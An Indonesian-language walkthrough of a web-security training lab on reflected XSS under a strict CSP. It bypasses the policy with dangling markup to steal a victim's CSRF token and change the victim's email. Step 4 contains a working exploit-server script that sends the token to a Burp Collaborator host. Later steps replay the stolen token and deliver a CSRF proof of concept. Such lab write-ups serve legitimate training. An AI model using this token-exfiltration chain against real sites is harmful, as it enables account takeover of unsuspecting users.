### Penjelasan Solusi untuk Lab: Reflected XSS dengan CSP Ketat dan Dangling Markup Attack

Lab ini memerlukan Anda untuk mengeksploitasi kerentanan **Reflected XSS** yang dibatasi oleh **Content Security Policy (CSP)**. Serangan bertujuan untuk:  
1. Mencuri token **CSRF** pengguna.  
2. Menggunakan token untuk mengubah email pengguna menjadi `hacker@evil-user.net`.  

---

### **Langkah-langkah Penyelesaian**

#### **1. Masuk ke Akun yang Disediakan**
- Masuk ke akun dengan kredensial:  
  - **Username:** `wiener`  
  - **Password:** `peter`  

#### **2. Identifikasi Kerentanan XSS**
- Pergi ke fungsi "Change Email".  
- Coba masukkan payload XSS di parameter email, misalnya:  
  ```html
  "><script>alert(1)</script>
  ```
- Periksa apakah kode Anda terefleksi di halaman. Jika berhasil, Anda dapat mengeksploitasi celah ini.

---

#### **3. Dapatkan Payload Burp Collaborator**
- Buka **Burp Suite** dan pergi ke tab **Collaborator**.  
- Klik **Copy to clipboard** untuk mendapatkan payload unik Collaborator Anda.

---

#### **4. Siapkan Payload untuk Exploit**
- Pergi ke **Exploit Server** di lab.  
- Masukkan kode berikut ke dalam editor exploit, lalu sesuaikan dengan **Burp Collaborator ID**, **Lab ID**, dan **Exploit Server ID**:  
  ```html
  <script>
  if(window.name) {
      new Image().src='//YOUR-COLLABORATOR-ID?'+encodeURIComponent(window.name);
  } else {
      location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
  }
  </script>
  ```
- Klik **Store** untuk menyimpan script.  

---

#### **5. Kirim Exploit ke Korban**
- Klik **Deliver exploit to victim**.  
- Saat korban membuka tautan dan mengklik link "Click me", browser mereka akan mengirimkan token CSRF ke server Burp Collaborator Anda.

---

#### **6. Ambil Token CSRF**
- Kembali ke tab **Collaborator** di Burp Suite.  
- Klik **Poll now** untuk melihat interaksi HTTP dari server korban.  
- Salin token CSRF yang muncul di permintaan tersebut.

---

#### **7. Ganti Email Pengguna**
- Pergi ke fungsi "Change Email".  
- Masukkan email apa saja untuk memulai permintaan.  
- Aktifkan **Intercept** di Burp Suite untuk menangkap permintaan.  

##### **Modifikasi Permintaan:**
1. Ganti nilai parameter `email` menjadi `hacker@evil-user.net`.  
2. Ganti token CSRF dengan token yang Anda curi dari korban.  

- Setelah modifikasi, kirim permintaan.

---

#### **8. Hasilkan CSRF PoC**
- Di Burp Suite, klik kanan pada permintaan dan pilih:  
  **Engagement tools** → **Generate CSRF PoC**.  
- Pastikan opsi **Include auto-submit script** aktif.  
- Klik **Regenerate** dan salin kode HTML yang dihasilkan.

---

#### **9. Kirimkan CSRF Exploit ke Korban**
- Pergi ke **Exploit Server** di lab.  
- Tempelkan HTML CSRF PoC ke editor exploit.  
- Klik **Store** dan **Deliver exploit to victim**.  

---

#### **10. Verifikasi**
- Jika berhasil, email korban akan diubah menjadi `hacker@evil-user.net`.  
- Lab selesai.

---

### **Catatan Tambahan**
- **CSP Bypass:** Menggunakan metode dangling markup (seperti `<base>` atau `<script>`) adalah teknik bypass yang efektif untuk CSP ketat.  
- **Burp Collaborator:** Hanya berfungsi di dalam jaringan lab, pastikan Anda menggunakan payload unik yang disediakan oleh Burp Collaborator.  
